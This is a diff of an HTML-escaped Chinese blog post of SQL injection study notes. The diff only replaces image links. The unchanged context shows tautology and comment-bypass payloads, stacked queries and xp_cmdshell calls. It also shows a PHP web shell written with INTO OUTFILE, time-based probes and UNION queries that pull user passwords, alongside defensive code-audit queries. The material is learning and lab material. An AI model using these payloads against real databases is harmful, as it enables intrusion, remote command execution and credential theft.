 &lt;span class=&#34;token keyword&#34;&gt;SET&lt;/span&gt; password &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;new_password&#39;&lt;/span&gt;
 &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Bob&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; password &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;old_password&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
@@ -707,10 +707,10 @@ http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproduct.php?
 &lt;span class=&#34;token keyword&#34;&gt;ORDER&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;BY&lt;/span&gt; received&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;少了引号的闭合，更简单了，直接构造永真返回全部&lt;code&gt;num or 1=1&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJ26jf.png&#34; alt=&#34;WJ26jf.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJ2RHg.png&#34; alt=&#34;WJ2RHg.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/8fd1fb2d04843d8266fc16528242a2fe.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/51d72d1c3f1546657dce86675b9594ed.png&#34;&gt;&lt;/p&gt;
 &lt;h4 id=&#34;终止式SQL注入&#34;&gt;&lt;a href=&#34;#终止式SQL注入&#34; class=&#34;headerlink&#34; title=&#34;终止式SQL注入&#34;&gt;&lt;/a&gt;终止式SQL注入&lt;/h4&gt;&lt;p&gt;攻击者在SQL注入代码时，通过注释掉剩余部分查询语句，从而结束原来的查询语句&lt;/p&gt;
-&lt;h5 id=&#34;数据库注释语法&#34;&gt;&lt;a href=&#34;#数据库注释语法&#34; class=&#34;headerlink&#34; title=&#34;数据库注释语法&#34;&gt;&lt;/a&gt;数据库注释语法&lt;/h5&gt;&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJ2LbF.png&#34; alt=&#34;WJ2LbF.png&#34;&gt;&lt;/p&gt;
+&lt;h5 id=&#34;数据库注释语法&#34;&gt;&lt;a href=&#34;#数据库注释语法&#34; class=&#34;headerlink&#34; title=&#34;数据库注释语法&#34;&gt;&lt;/a&gt;数据库注释语法&lt;/h5&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/81720d0d80330ebb159aadb6ca6c3bd2.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;/* */&lt;/code&gt;可以用来绕过过滤空格&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;1 or 1=1 &lt;/code&gt;过滤空格变成&lt;code&gt;1or1=1&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;/* */&lt;/code&gt;绕过 &lt;code&gt;1/**/or/**/1=1&lt;/code&gt;&lt;/p&gt;
@@ -727,9 +727,9 @@ http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproduct.php?
 &lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;admin&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; AND passwd = &#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;注释后剩一对单引号，连接形成空字符串，对查询无影响&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJRS81.png&#34; alt=&#34;WJRS81.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/d88c49974a29200155cf33378156e89b.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;可以用来判断数据库类型&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJR9v6.png&#34; alt=&#34;WJR9v6.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/a87270ed8be250f52c67e92a08d774e1.png&#34;&gt;&lt;/p&gt;
 &lt;h5 id=&#34;执行多条语句&#34;&gt;&lt;a href=&#34;#执行多条语句&#34; class=&#34;headerlink&#34; title=&#34;执行多条语句&#34;&gt;&lt;/a&gt;执行多条语句&lt;/h5&gt;&lt;p&gt;还有另一个名字，堆叠注入，终止了一条语句，可以创建一条全新的没有限制的语句，简单说就是将原始语句结束，在后面加几条新语句&lt;/p&gt;
 &lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; a &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; q&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; b &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; w&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 
@@ -746,7 +746,7 @@ http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproduct.php?
 &lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;?php echo shell_exec($_GET[&#34;cmd&#34;]);?&amp;gt;&#39;&lt;/span&gt;
 &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;OUTFILE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/var/www/victim.com/shell.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJRiDO.png&#34; alt=&#34;WJRiDO.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/3a91874d8bb2d2ad880d89fdd1f51473.png&#34;&gt;&lt;/p&gt;
 &lt;h4 id=&#34;时间延迟&#34;&gt;&lt;a href=&#34;#时间延迟&#34; class=&#34;headerlink&#34; title=&#34;时间延迟&#34;&gt;&lt;/a&gt;时间延迟&lt;/h4&gt;&lt;p&gt;没有回显和报错信息被隐藏的时候，可以向数据库注入时间延迟，数据库返回的时间反映在web页面，用来确定是否有SQL注入&lt;/p&gt;
 &lt;p&gt;mssql内置的设置延迟的命令&lt;code&gt;waitfor delay &#39;hours:minutes:seconds&#39;&lt;/code&gt;&lt;/p&gt;
 &lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;waitfor&lt;/span&gt; delay &lt;span class=&#34;token string&#34;&gt;&#39;0:0:5&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
@@ -1255,16 +1255,16 @@ quit&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt
 &lt;p&gt;使用下列SQL语句来获取PL/SQL代码的源&lt;/p&gt;
 &lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; owner &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; Owner&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; name &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; Name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; Source &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; dba_source &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;LOWER&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Source&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;LIKE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%immediate%&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;LOWER&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Source&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;LIKE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%dbms_sql&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; owner&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;PLSQL&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJRMKf.png&#34; alt=&#34;WJRMKf.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/840f9086a329bf41df56550583bdcb36.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;这三条语句易受到攻击，未验证的参数传给了危险的函数&lt;/p&gt;
 &lt;p&gt;寻找参数复制给局部定义的变量&lt;/p&gt;
 &lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; owner &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; Owner&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; name &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; Name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; Source &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; dba_source &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; lower&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Source&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%:=%||%&#39;&#39;%&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJRN2q.png&#34; alt=&#34;WJRN2q.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/d4fd03c14a6b885f11cfe09069f46727.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;上述SQL语句找到了一个利用用户控制的数据动态创建SQL语句的包。我们有必要对该包做进一步审查，可以使用下列SQL语句追溯包(package)的源以便进一步审查其内容&lt;/p&gt;
 &lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; Source &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; dba_source &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; name&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SP_STORED_PROCEDURE&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; owner&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SYSMAN&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt; line&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJR0qU.png&#34; alt=&#34;WJR0qU.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/268e43e5f0121d8c4c2fc627816da7d0.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;input直接与SQL字符串相连，可以判断存在SQL注入&lt;/p&gt;
 &lt;p&gt;搜索数据库中所有的代码&lt;/p&gt;
 &lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;-- Purpose: A PL/SQL script to search the DB for potentially vulnerable &lt;/span&gt;
@@ -1405,7 +1405,7 @@ mysql_db_query &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;spa
 
 &lt;h4 id=&#34;OWASP-LAPSE-项目&#34;&gt;&lt;a href=&#34;#OWASP-LAPSE-项目&#34; class=&#34;headerlink&#34; title=&#34;OWASP LAPSE+项目&#34;&gt;&lt;/a&gt;OWASP LAPSE+项目&lt;/h4&gt;&lt;h4 id=&#34;Microsoft-SQL注入源代码分析器&#34;&gt;&lt;a href=&#34;#Microsoft-SQL注入源代码分析器&#34; class=&#34;headerlink&#34; title=&#34;Microsoft SQL注入源代码分析器&#34;&gt;&lt;/a&gt;Microsoft SQL注入源代码分析器&lt;/h4&gt;&lt;h4 id=&#34;CAT-NET&#34;&gt;&lt;a href=&#34;#CAT-NET&#34; class=&#34;headerlink&#34; title=&#34;CAT.NET&#34;&gt;&lt;/a&gt;CAT.NET&lt;/h4&gt;&lt;h4 id=&#34;RIPS——PHP脚本漏洞的静态源代码分析器&#34;&gt;&lt;a href=&#34;#RIPS——PHP脚本漏洞的静态源代码分析器&#34; class=&#34;headerlink&#34; title=&#34;RIPS——PHP脚本漏洞的静态源代码分析器&#34;&gt;&lt;/a&gt;RIPS——PHP脚本漏洞的静态源代码分析器&lt;/h4&gt;&lt;h4 id=&#34;CodePro-AnalytiX&#34;&gt;&lt;a href=&#34;#CodePro-AnalytiX&#34; class=&#34;headerlink&#34; title=&#34;CodePro AnalytiX&#34;&gt;&lt;/a&gt;CodePro AnalytiX&lt;/h4&gt;&lt;h4 id=&#34;Teachable-Static-Analysis-Workbench&#34;&gt;&lt;a href=&#34;#Teachable-Static-Analysis-Workbench&#34; class=&#34;headerlink&#34; title=&#34;Teachable Static Analysis Workbench&#34;&gt;&lt;/a&gt;Teachable Static Analysis Workbench&lt;/h4&gt;&lt;h4 id=&#34;商业源代码复查工具&#34;&gt;&lt;a href=&#34;#商业源代码复查工具&#34; class=&#34;headerlink&#34; title=&#34;商业源代码复查工具&#34;&gt;&lt;/a&gt;商业源代码复查工具&lt;/h4&gt;&lt;h4 id=&#34;Fortify源代码分析器&#34;&gt;&lt;a href=&#34;#Fortify源代码分析器&#34; class=&#34;headerlink&#34; title=&#34;Fortify源代码分析器&#34;&gt;&lt;/a&gt;Fortify源代码分析器&lt;/h4&gt;&lt;h4 id=&#34;Rational-AppScan-Source-Edition&#34;&gt;&lt;a href=&#34;#Rational-AppScan-Source-Edition&#34; class=&#34;headerlink&#34; title=&#34;Rational AppScan Source Edition&#34;&gt;&lt;/a&gt;Rational AppScan Source Edition&lt;/h4&gt;&lt;h4 id=&#34;CodeSecure&#34;&gt;&lt;a href=&#34;#CodeSecure&#34; class=&#34;headerlink&#34; title=&#34;CodeSecure&#34;&gt;&lt;/a&gt;CodeSecure&lt;/h4&gt;&lt;h4 id=&#34;Klocwork-Solo&#34;&gt;&lt;a href=&#34;#Klocwork-Solo&#34; class=&#34;headerlink&#34; title=&#34;Klocwork Solo&#34;&gt;&lt;/a&gt;Klocwork Solo&lt;/h4&gt;&lt;h2 id=&#34;利用SQL注入&#34;&gt;&lt;a href=&#34;#利用SQL注入&#34; class=&#34;headerlink&#34; title=&#34;利用SQL注入&#34;&gt;&lt;/a&gt;利用SQL注入&lt;/h2&gt;&lt;h3 id=&#34;常见的漏洞利用技术&#34;&gt;&lt;a href=&#34;#常见的漏洞利用技术&#34; class=&#34;headerlink&#34; title=&#34;常见的漏洞利用技术&#34;&gt;&lt;/a&gt;常见的漏洞利用技术&lt;/h3&gt;&lt;p&gt;本章大多用这个示例&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;http://sql/Less-2/?id=1&#34;&gt;http://sql/Less-2/?id=1&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJRcGR.png&#34; alt=&#34;WJRcGR.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/dd9f49a480d63d71849c61af3a1bb103.png&#34;&gt;&lt;/p&gt;
 &lt;h4 id=&#34;使用堆叠注入&#34;&gt;&lt;a href=&#34;#使用堆叠注入&#34; class=&#34;headerlink&#34; title=&#34;使用堆叠注入&#34;&gt;&lt;/a&gt;使用堆叠注入&lt;/h4&gt;&lt;p&gt;堆叠查询（stacked query）指的是在单个数据库连接中执行多个查询序列，使用不同的数据库和不同的web框架，对堆叠查询支持情况也不同，使用ASP.NET和PHP访问Microsoft SQL Server时允许堆叠查询，但如果使用Java来访问，就不允许。使用PHP访问PostgreSQL时， PHP允许堆叠查询，但如果访问MySQL, PHP不允许堆叠查询。&lt;/p&gt;
 &lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/products.asp=id=l;exec+master..xp_cmdshell+&#39;dir&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 
@@ -1497,9 +1497,9 @@ nvarchar &lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt; &lt;span c
 
 &lt;h4 id=&#34;盲追踪&#34;&gt;&lt;a href=&#34;#盲追踪&#34; class=&#34;headerlink&#34; title=&#34;盲追踪&#34;&gt;&lt;/a&gt;盲追踪&lt;/h4&gt;&lt;p&gt;应用不会返回信息时，利用不同数据库使用SQL语法不同产生的差异来判断数据库类型。&lt;/p&gt;
 &lt;h5 id=&#34;连接字符串的方式&#34;&gt;&lt;a href=&#34;#连接字符串的方式&#34; class=&#34;headerlink&#34; title=&#34;连接字符串的方式&#34;&gt;&lt;/a&gt;连接字符串的方式&lt;/h5&gt;&lt;p&gt;用不同的支付串连接方式注入，通过原始请求返回结果对比，若相同，则为对应数据库。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJRXsf.png&#34; alt=&#34;WJRXsf.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/db5df62ba1c448f7b78f246d43b03ad3.png&#34;&gt;&lt;/p&gt;
 &lt;h5 id=&#34;数字函数&#34;&gt;&lt;a href=&#34;#数字函数&#34; class=&#34;headerlink&#34; title=&#34;数字函数&#34;&gt;&lt;/a&gt;数字函数&lt;/h5&gt;&lt;p&gt;相当于不同数据库的特征值，原理和前面相似&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJWkQ0.png&#34; alt=&#34;WJWkQ0.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/87b6f9ee5436f469cb58fd426a00d7c1.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;例如，成功注入&lt;code&gt;WAITEOR DELAY&lt;/code&gt;，表明数据库是mssql，成功注入&lt;code&gt;select pg_sleep(10)&lt;/code&gt;，表明数据库是PostgreSQL&lt;/p&gt;
 &lt;p&gt;Mysql精确确定版本&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;/* !版本号 语句*/&lt;/code&gt;若数据库版本号高于或等于！后面的，就会执行语句&lt;/p&gt;
@@ -1520,7 +1520,7 @@ nvarchar &lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt; &lt;span c
 &lt;li&gt;两个select对应列返回的数据类型是兼容的&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;如果无法满足这两个条件就会查询失败并返回一个错误，下面是一些数据库返回的错误&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJWmo4.png&#34; alt=&#34;WJWmo4.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/e78b0ba30b6e81959a8c7d560b34f51b.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;要得到正确的列数，两种方法&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;p&gt;每次增加列数，不断尝试&lt;/p&gt;
@@ -1558,7 +1558,7 @@ http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=12+union+select+NULL,N
 &lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=12+union+select+NULL,concat(version(),0x7e,database()),NULL&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;如果想要检索的不是字符串字，却只有支付串值的字段，可以使用强制转换为字符串&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJWD6P.png&#34; alt=&#34;WJWD6P.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/2a1757616fa87006e38575c695c27afd.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;PostgreSQL允许使用&lt;code&gt;||&lt;/code&gt;连接字符串，只要有一个变量是字符串即可作为字符串值&lt;/p&gt;
 &lt;h4 id=&#34;只返回一条结果&#34;&gt;&lt;a href=&#34;#只返回一条结果&#34; class=&#34;headerlink&#34; title=&#34;只返回一条结果&#34;&gt;&lt;/a&gt;只返回一条结果&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//sql/Less-2/?id=12 union select NULL,username,password from users&lt;/span&gt;
 &lt;span class=&#34;token comment&#34;&gt;-- 正常来说这条语句可以返回表中所有数据，但是有时只会返回一条数据&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
@@ -1570,7 +1570,7 @@ http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=12+union+select+NULL,N
 &lt;span class=&#34;token comment&#34;&gt;-- 加一个限制条件返回第二条数据，where也行&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 
 &lt;h3 id=&#34;使用条件语句&#34;&gt;&lt;a href=&#34;#使用条件语句&#34; class=&#34;headerlink&#34; title=&#34;使用条件语句&#34;&gt;&lt;/a&gt;使用条件语句&lt;/h3&gt;&lt;p&gt;构建条件语句，条件语句的执行结果强迫服务器返回不同的结果，由结果的状态来判断条件是否为真&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://z3.ax1x.com/2021/07/19/WJW560.png&#34; alt=&#34;WJW560.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/ad493d6543d96db885d9a1428870d1ea.png&#34;&gt;&lt;/p&gt;
 &lt;h4 id=&#34;基于时间&#34;&gt;&lt;a href=&#34;#基于时间&#34; class=&#34;headerlink&#34; title=&#34;基于时间&#34;&gt;&lt;/a&gt;基于时间&lt;/h4&gt;&lt;p&gt;基于Web应用响应时间上的差异，该时间取决于某些信息的值。&lt;/p&gt;
